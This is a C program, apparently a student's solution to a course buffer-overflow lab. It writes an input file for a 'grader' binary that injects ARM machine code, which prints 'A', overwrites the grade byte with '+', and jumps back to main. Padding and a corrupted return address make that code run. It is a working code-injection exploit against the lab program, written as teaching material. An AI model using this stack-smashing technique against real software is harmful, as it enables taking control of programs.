/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Authors: Catherine Yu and Joseph Chen                              */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

/* Create a file dataAplus. Write to dataA the input of grader such
   that the output prints A+ as the grade. Return 0. */

int main(void)
{
   int i;
   FILE *psFile;
   unsigned long ulData;

   /* Create file dataA */
   psFile = fopen("dataAplus" , "w");

   /* Write the buffer overflow input to dataAplus */
   fprintf(psFile, "Joe");
   putc('\0', psFile);

   /* store into x0 the address of string "A" in BSS and branch link to
      printf */

   /* adr x0, 0x420074 */
   ulData = MiniAssembler_adr(0, 0x420074, 0x42005c);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* bl printf */
   ulData = MiniAssembler_bl(0x400600, 0x420060);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);
   
   /* change the character stored in grade from 'D' to '+' */
   
   /* mov w0, 0x2B */
   ulData = MiniAssembler_mov(0, '+');
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* adr x1, address of grade*/
   ulData = MiniAssembler_adr(1, 0x420044, 0x420068);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* strb x0, [x1] */
   ulData = MiniAssembler_strb(0, 1);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* b address of return address in main */
   ulData = MiniAssembler_b(0x400864, 0x420070);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* write string "A" to dataAplus */
   putc('A', psFile);
   
   /* add null characters to fill buffer */
   for(i = 0; i < 19; i++)
      putc('\0', psFile);

   /* corrupt return address */
   ulData = 0x42005c;
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   fclose(psFile);

   return 0;
}


